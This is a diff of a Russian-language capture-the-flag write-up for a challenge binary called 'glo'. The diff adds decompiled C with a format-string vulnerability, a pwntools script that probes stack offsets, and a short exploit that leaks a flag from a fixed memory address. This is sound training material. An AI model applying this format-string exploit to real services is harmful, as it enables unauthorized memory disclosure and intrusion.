@@ -5,14 +5,72 @@ Here is glo service
 **[glo.elf](https://pwn.spbctf.ru/files/www/glo/glo.elf)**
 
 Код:
-![{73C10266-351B-4DF7-A48F-C7373D20BECE}](../../../../z.%20Images/{73C10266-351B-4DF7-A48F-C7373D20BECE}.png)
+``` C
+void __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char format[256]; // [rsp+0h] [rbp-150h] BYREF
+  char password[32]; // [rsp+100h] [rbp-50h] BYREF
+  char login[40]; // [rsp+120h] [rbp-30h] BYREF
+  FILE *stream; // [rsp+148h] [rbp-8h]
+
+  setvbuf(stdout, nullptr, 2, 0);
+  stream = fopen("flag.txt", "r");
+  fread(&flag, 0x400u, 1u, stream);
+  fclose(stream);
+
+  puts("Welcome to GLO");
+  puts("Enter login");
+  fgets(login, 32, stdin);
+  strip((__int64)login, 32);
+  snprintf(format, 256u, ::format, login);
+
+  puts("Enter password");
+  fgets(password, 32, stdin);
+  strip((__int64)password, 32);
+  printf(format, password);
+}
+```
 
 Для начала необходимо найти смещение в стеке, куда записывается буфер:
-![{7C458406-64D4-4CB4-9971-83A9C42BA227}](../../../../z.%20Images/{7C458406-64D4-4CB4-9971-83A9C42BA227}.png)
+``` python
+for i in range(100):
+    io = start()
+
+    io.recvline()
+    io.recvline()
+    payload = f'AAAAAAAA.%{i}$p'
+    io.sendline(payload)
+    io.recvline()
+    io.sendline()
+    io.recvline()
+
+    s = io.recvline().decode()
+    io.recvline()
+    io.recvline()
+
+    if '41' * 8 in s:
+        print(i, s)
+        break
+```
 ![{4A0B64BF-C953-4801-9913-E065531B7939}](../../../../z.%20Images/{4A0B64BF-C953-4801-9913-E065531B7939}.png)
 
-Теперь необходимо считать флаг по адресу в памяти. Солвер:
-![{8B2D1F2C-7E3F-4749-AA7D-2F2257A48E32}](../../../../z.%20Images/{8B2D1F2C-7E3F-4749-AA7D-2F2257A48E32}.png)
+Теперь необходимо считать флаг по адресу в памяти.
+Эксплоит:
+``` python
+n = 42
+flag = 0x4040A0
+
+io = start()
+
+payload = flat({
+    0x0: f'%{n+1}$s'.encode(),
+    0x08: p64(flag)
+})
+io.sendline(payload)
+io.sendline()
+
+io.interactive()
+```
 
 Запуск:
 ![{0852A0EC-9CD1-4927-95F9-68B861F5083A}](../../../../z.%20Images/{0852A0EC-9CD1-4927-95F9-68B861F5083A}.png)
